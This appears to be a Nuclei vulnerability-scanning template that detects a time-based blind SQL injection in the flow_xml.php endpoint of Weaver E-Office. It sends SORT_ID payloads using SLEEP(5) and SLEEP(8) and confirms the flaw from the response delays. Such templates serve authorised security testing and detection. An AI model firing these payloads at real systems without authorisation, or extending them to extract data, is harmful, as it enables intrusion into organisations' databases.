id: poc-yaml-weaver-e-office-flow-xml-sqli
info:
  name: 泛微E-Office flow_xml.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 泛微E-Office

http:
  - raw:
    - |
      GET /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1+AND+(SELECT+2329+FROM+(SELECT(SLEEP(5)))URgU) HTTP/1.1
      Host: {{Hostname}}
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    - |
      GET /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1+AND+(SELECT+2329+FROM+(SELECT(SLEEP(8)))URgU) HTTP/1.1
      Host: {{Hostname}}
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<?xml version=\"1.0\"?>"
          - "<tree>"
        part: body
      - type: dsl
        dsl:
        - 'duration_1>=5 && duration_1<=6'
        - 'duration_2 - duration_1 >2'
        condition: and
